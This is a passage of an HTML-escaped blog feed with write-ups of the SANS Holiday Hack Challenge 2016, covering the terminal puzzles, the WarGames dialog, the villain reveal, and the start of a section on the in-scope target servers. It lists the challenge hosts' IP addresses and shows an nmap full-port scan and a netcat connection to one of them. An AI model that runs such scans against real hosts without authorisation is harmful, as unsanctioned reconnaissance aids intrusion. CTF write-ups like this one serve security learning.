&lt;span class=&quot;nv&quot;&gt;*thwock&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;!*&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;*groan&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;*crash&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;A horrible roar fills the cave, and you realize, with a smile, that you&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;have slain the evil Wumpus and won the game!  You don't want to tarry for&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;long, however, because not only is the Wumpus famous, but the stench of&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;dead Wumpus is also quite well known, a stench plenty enough to slay the&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;mightiest adventurer at a single whiff!!&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Passphrase&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;WUMPUS IS MISUNDERSTOOD&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Care to play another game? (y-n)&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that’s what I’m talking about.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/Coin_WUMPUS.png&quot; alt=&quot;challenge_coin&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;doormat-challenge&quot;&gt;Doormat Challenge&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/terminal2_workshop_passphrase_cat_door.png&quot; alt=&quot;terminal&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-objective--find-the-hidden-passphrase&quot;&gt;Challenge Objective:  Find the Hidden Passphrase&lt;/h3&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;*******************************************************************************&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;To open the door, find the passphrase file deep in the directories.         *&lt;/span&gt; 
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*******************************************************************************&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Passwords (passphrases) are typically found in text files, so I’ll see if I can find any .txt files first.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ find / -name *.txt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;/home/elf/.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that the location for the key is known, I just have to get to it.  It’s not as straightforward as simply changing to that directory and viewing the file. Certain characters need to be escaped.  Escaping is a method of quoting single characters. The escape (&lt;code class=&quot;highlighter-rouge&quot;&gt;\&lt;/code&gt;) preceding a character tells the shell to interpret that character literally.&lt;/p&gt;

&lt;p&gt;Here is a one liner with each character being escaped.  Running this command will print out the passphrase:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat &quot;/home/elf/.doormat/. / /\/\\\\/&quot;&quot;Don't Look Here&quot;'!'&quot;&quot;/&quot;You are persistent, aren't you?&quot;/&quot;'&quot;/&quot;key_for_the_door.txt&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which prints out:  &lt;code class=&quot;highlighter-rouge&quot;&gt;key: open_sesame&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Or you can achieve the same thing manually browsing directory by directory…&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/elf/
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .doormat
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;. /&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Don't Look Here!&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;You are persistent, aren't you?&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# to see all directories including hidden ones &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key_for_the_door.txt
key: open_sesame
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/Coin_doormat_challenge.png&quot; alt=&quot;coin&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;war-games-challenge&quot;&gt;War Games Challenge&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/terminal_santa_office.png&quot; alt=&quot;wargames&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-objective--start-a-global-thermonuclear-war&quot;&gt;Challenge Objective:  Start a Global Thermonuclear War&lt;/h3&gt;

&lt;p&gt;To win this challenge, you need to enter the dialog from the 1983 movie &lt;a href=&quot;https://en.wikipedia.org/wiki/WarGames&quot;&gt;WarGames&lt;/a&gt;. It has to be EXACT.  Now you can watch the &lt;a href=&quot;https://www.youtube.com/watch?v=KXzNo0vR_dU&quot;&gt;movie clips on YouTube&lt;/a&gt; and type it manually or use the &lt;a href=&quot;https://github.com/abs0/wargames/blob/master/wargames.sh&quot;&gt;wargames.sh&lt;/a&gt; script found on GitHub.  That script will almost get you past this challenge with one exception, line 216 says “Later. Lets play Global Thermonuclear War.” It should be “Later. Let’s play Global Thermonuclear War.”&lt;/p&gt;

&lt;p&gt;The text in ALL CAPTIALS is from the terminal.  The text in lowercase is what I entered.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GREETINGS PROFESSOR FALKEN.

Hello.

HOW ARE YOU FEELING TODAY?

I'm fine. How are you?

EXCELLENT.  IT'S BEEN A LONG TIME.  CAN YOU EXPLAIN
THE REMOVAL OF YOUR USER ACCOUNT NUMBER ON 6/23/73?

People sometimes make mistakes.

YES THEY DO.  SHALL WE PLAY A GAME?

Love to. How about Global Thermonuclear War?

WOULDN'T YOU PREFER A GOOD GAME OF CHESS?

Later. Let's play Global Thermonuclear War.

FINE

     WHICH SIDE DO YOU WANT?
  1.   UNITED STATES
  2.   SOVIET UNION
      PLEASE CHOOSE ONE:
2

PLEASE LIST PRIMARY TARGETS BY
CITY AND/OR COUNTY NAME:

Las Vegas

LAUNCH INITIATED, HERE'S THE KEY FOR YOUR TROUBLE: 
LOOK AT THE PRETTY LIGHTS
Press Enter To Continue

`LOOK AT THE PRETTY LIGHTS` is the passphase to enter The Corridor hidden behind Santa's bookshelf.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Passphase is &lt;code class=&quot;highlighter-rouge&quot;&gt;LOOK AT THE PRETTY LIGHTS&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/Coin_wargames.png&quot; alt=&quot;coin&quot; /&gt;&lt;/p&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">SANS Holiday Hack 2016 Writeup - The Terminals</summary></entry><entry><title type="html">Part 5: Discombobulated Audio</title><link href="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt5-2016/" rel="alternate" type="text/html" title="Part 5: Discombobulated Audio" /><published>2016-03-06T00:00:00-08:00</published><updated>2016-03-06T10:56:50-08:00</updated><id>https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt5-2016</id><content type="html" xml:base="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt5-2016/">&lt;p class=&quot;notice--danger&quot;&gt;Question 9: Who is the villain behind the nefarious plot?&lt;/p&gt;

&lt;p class=&quot;notice--danger&quot;&gt;Question 10: Why had the villain abducted Santa?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.audacityteam.org&quot;&gt;Audacity&lt;/a&gt; was used to combine all seven (7) of the MP3 files into one track and increased the tempo to 270% to hear the secret message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/audacity_image.png&quot; alt=&quot;Audacity-Image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you’d like to hear it, this is my &lt;a href=&quot;/assets/files/uncombobulatedaudio.mp3&quot;&gt;uncombobulatedaudio.mp3&lt;/a&gt; version.  Or just read the message below:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Father Christmas, Santa Claus. Or, as I’ve always known him, Jeff.”  - Source: &lt;a href=&quot;http://www.imdb.com/title/tt1672218/quotes?item=qt1395415&quot;&gt;IMDB&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p class=&quot;notice&quot;&gt;Who is the villain behind the nefarious plot?
Dr. Who&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/dr_who.png&quot; alt=&quot;dr_who&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dr. Who:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The question of the hour is this: Who nabbed Santa.&lt;br /&gt;
The answer? Yes, I did.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p class=&quot;notice&quot;&gt;Why had the villain abducted Santa?
To prevent the Star Wars Holiday Special from being released&lt;/p&gt;

&lt;p&gt;Dr. Who:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Next question: Why would anyone in his right mind kidnap Santa Claus? &lt;br /&gt;&lt;br /&gt;The answer: Do I look like I’m in my right mind? I’m a madman with a box. I have looked into the time vortex and I have seen a universe in which the Star Wars Holiday Special was NEVER released. In that universe, 1978 came and went as normal. No one had to endure the misery of watching that abominable blight. People were happy there. It’s a better life, I tell you, a better world than the scarred one we endure here. Give me a world like that. Just once. So I did what I had to do. I knew that Santa’s powerful North Pole Wonderland Magick could prevent the Star Wars Special from being released, if I could leverage that magick with my own abilities back in 1978. But Jeff refused to come with me, insisting on the mad idea that it is better to maintain the integrity of the universe’s timeline. So I had no choice – I had to kidnap him. It was sort of one of those days. Well. You know what I mean. Anyway… Since you interfered with my plan, we’ll have to live with the Star Wars Holiday Special in this universe… FOREVER. If we attempt to go back again, to cross our own timeline, we’ll cause a temporal paradox, a wound in time. We’ll never be rid of it now. The Star Wars Holiday Special will plague this world until time itself ends… All because you foiled my brilliant plan. Nice work.
…&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">SANS Holiday Hack 2016 Writeup - The Challenges - Part 5</summary></entry><entry><title type="html">Part 4: My Gosh… It’s Full of Holes</title><link href="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt4-2016/" rel="alternate" type="text/html" title="Part 4: My Gosh... It's Full of Holes" /><published>2016-03-06T00:00:00-08:00</published><updated>2016-03-06T10:56:50-08:00</updated><id>https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt4-2016</id><content type="html" xml:base="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt4-2016/">&lt;p class=&quot;notice--danger&quot;&gt;Question 7: ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS… For each of those six items, which vulnerabilities did you discover and exploit?&lt;/p&gt;

&lt;p class=&quot;notice--danger&quot;&gt;Question 8: What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)&lt;/p&gt;

&lt;p&gt;Below is the list of the six (6) vulnerable servers to target. Each hosting a hidden ‘discombobulatedaudio’ MP3 file.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Target&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;IP Address&lt;/th&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;DNS&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The Mobile Analytics Server (via credentialed login access)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;104.198.252.157&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;analytics.northpolewonderland.com&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The Mobile Analytics Server (post authentication)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;104.198.252.157&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;analytics.northpolewonderland.com&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The Dungeon Game&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;35.184.47.139&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;dungeon.northpolewonderland.com&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The Debug Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;35.184.63.245&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;dev.northpolewonderland.com&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The Banner Ad Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;104.198.221.240&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;ads.northpolewonderland.com&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The Uncaught Exception Handler Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;104.154.196.33&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;ex.northpolewonderland.com&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;All target servers were discovered within the same file inside the SantaGram APK file.&lt;/p&gt;

&lt;h3 id=&quot;the-dungeon-game&quot;&gt;The Dungeon Game&lt;/h3&gt;

&lt;p&gt;One of the elves (Pepper Minstix) provides a link to an &lt;a href=&quot;https://www.northpolewonderland.com/dungeon.zip&quot;&gt;offline version&lt;/a&gt; of the game ‘Dungeon’.  A text based adventure game created at the Programming Technology Division of the MIT Laboratory for Computer Science.  It also goes by the name ‘Zork’.&lt;/p&gt;

&lt;p&gt;Extracting the ZIP file reveals two (2) files.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Linux ELF executable (dungeon)&lt;/li&gt;
  &lt;li&gt;DAT file (dtextc.dat)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After some research, it seemed that all the good stuff was stored in the DAT file.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; didn’t turn up anything useful on either file.  A &lt;a href=&quot;https://www.google.com/search?num=100&amp;amp;q=decode+dungeon+dtextc.dat&amp;amp;oq=decode+dungeon+dtextc.dat&quot;&gt;Google search&lt;/a&gt; revealed that there was a way to decode the dtextc.dat file.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.mit.edu/jhawk/src/cdungeon-decode.c&quot;&gt;http://web.mit.edu/jhawk/src/cdungeon-decode.c&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ curl -O http://web.mit.edu/jhawk/src/cdungeon-decode.c&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;/span&gt;
                                 &lt;span class=&quot;s&quot;&gt;Dload  Upload   Total   Spent    Left  Speed&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;100 70303  100 70303    0     0  69473      0  0:00:01  0:00:01 --:--:-- 69538&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ gcc cdungeon-decode.c -o cdungeon-decode&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# A few warnings were generated but it still compiled.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running the decode script…&lt;/p&gt;
&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ ./cdungeon-decode&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Copyright (c) Ian Lance Taylor 1991 &amp;lt;ian@airs.com&amp;gt;&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;data -[aobn] [inputfile(s)] -[aobns] [outputfile(s)]&lt;/span&gt;
       &lt;span class=&quot;s&quot;&gt;-a ASCII (readable) format; one file&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;input default stdin, output default stdout&lt;/span&gt;
       &lt;span class=&quot;s&quot;&gt;-o old (f77) format; index file, text file&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;input default library files, output default local files&lt;/span&gt;
       &lt;span class=&quot;s&quot;&gt;-b new compressed binary format; one file&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;input default library file, output default local file&lt;/span&gt;
       &lt;span class=&quot;s&quot;&gt;-n is a synonym for -b&lt;/span&gt;
       &lt;span class=&quot;s&quot;&gt;-s creates a sequential file (Alpha Micro only)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Feeding it the .dat file and specifying the output text file…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ ./cdungeon-decode -n dungeon/dtextc.dat -a dungeon/dtextc.txt&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Searching for the text &lt;code class=&quot;highlighter-rouge&quot;&gt;elf&lt;/code&gt; within the new text file…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ cat dungeon/dtextc.txt | grep -i -A1 -B1 'elf'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1023&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;The elf, willing to bargain, says &quot;What's in it for me?&quot;&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1024&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1024&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;The elf, satisified with the trade says -&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;Try the online version for the &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; prize&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1026&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;The elf appears increasingly impatient.&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1027&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1027&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;The elf says - you have conquered this challenge - the game will now end.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looks like &lt;code class=&quot;highlighter-rouge&quot;&gt;Message: 1024&lt;/code&gt; would hold the information needed, but it says to “try the online version.”  There is also a Debug Mode (GDT) for this game per &lt;a href=&quot;http://gunkies.org/wiki/Zork_hints&quot;&gt;http://gunkies.org/wiki/Zork_hints&lt;/a&gt;.  Using the GDT mode can take me right to the message I want to see using the &lt;code class=&quot;highlighter-rouge&quot;&gt;TD&lt;/code&gt; command to ‘Display Text’.&lt;/p&gt;

&lt;p&gt;Time to see what ports are open on this host.  A quick &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan with service detection (-sV) hitting all TCP ports (-p-) should tell us more. Out of habit, I also save the results locally (-oA). This saves the output in the three major formats (.xml, .gnmap, and .nmap) at once.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ nmap -sV -p- dungeon.northpolewonderland.com -oA dungeon.northpolewonderland.com&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 12:24 EST&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Nmap scan report for dungeon.northpolewonderland.com (35.184.47.139)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Host is up (0.047s latency).&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;rDNS record for 35.184.47.139&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;139.47.184.35.bc.googleusercontent.com&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Not shown&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;65531 closed ports&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PORT      STATE    SERVICE    VERSION&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;22/tcp    open     ssh        OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;25/tcp    filtered smtp&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;80/tcp    open     http       nginx 1.6.2&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;11111/tcp open     tcpwrapped&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Service Info&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;OS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Linux; CPE&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cpe:/o:linux:linux_kernel&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Nmap done&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1 IP address (1 host up) scanned in 30.91 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP 11111&lt;/code&gt; looks interesting.  Let’s netcat to that port.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads/dungeon $ nc dungeon.northpolewonderland.com 11111&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Welcome to Dungeon.&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;			&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;This version created 11-MAR-78.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;You are in an open field west of a big white house with a boarded&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;front door.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;There is a small wrapped mailbox here.&lt;/span&gt;
